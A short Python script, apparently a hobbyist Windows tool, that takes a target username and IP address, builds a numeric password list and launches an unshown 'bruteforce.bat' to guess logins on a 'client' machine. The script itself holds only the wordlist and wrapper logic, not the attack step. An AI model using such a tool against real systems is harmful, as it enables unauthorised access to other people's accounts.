import time
import os

def brute_force():
    while True:
        q1 = input("Would you like to start brute-forcing? (y/n): ").lower()
        if q1 in ["y", "yes"]:
            break
        elif q1 in ["n", "no"]:
            print("Exiting...")
            time.sleep(2)
            return
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

    user = input("Enter Client's Username: ")
    ipaddr = input("Enter Clients Ip Address: ")

    with open("user.txt", "w") as userFile:
        userFile.write(user)
    with open("ipaddr.txt", "w") as ipaddrFile:
        ipaddrFile.write(ipaddr)

    os.system("bruteforce.bat")

def password_list_generator(max_range):
    max_range = int(max_range)

    with open("passwords.txt", "w") as file:
        for number in range(max_range, 0, -1):
            file.write(str(number) + '\n')
    
    brute_force()

def main():
    max_range = input("Enter the Max Number in Range: ")
    password_list_generator(max_range)

if __name__ == "__main__":
    os.system("color a")
    main()
